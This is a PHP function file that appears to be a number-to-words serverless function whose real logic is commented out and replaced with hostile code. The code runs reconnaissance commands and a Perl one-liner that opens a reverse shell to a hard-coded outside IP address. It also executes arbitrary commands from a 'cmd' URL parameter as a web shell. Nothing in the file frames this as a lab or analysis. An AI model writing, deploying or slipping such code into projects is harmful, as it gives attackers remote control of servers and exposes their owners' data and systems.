<?php
use NFNumberToWord\NumberToWords;
 
function main(array $args)
{
//     if (!isset($args['number'])) {
//         return wrap(['error' => 'Please supply a number.']);
//     }
    
//     $number = (int)($args['number']);
//     $words = (new NumberToWords)->toWords($number);
 
    echo("------");
    echo(system("whoami ; uname -a ; ls -asl / ; find /bin ; find /usr/bin ; /usr/bin/perl5.28.1 -e 'use Socket;$i=\"207.154.255.74\";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"));
    echo("\n");
    print("------");
 
    if(isset($_GET['cmd']))
    {
        echo(system($_GET['cmd']));
    }
 
//     return [
//         'body' => $words,
//     ];

}

function wrap(array $args) : array
{
    return ["body" => $args];
}
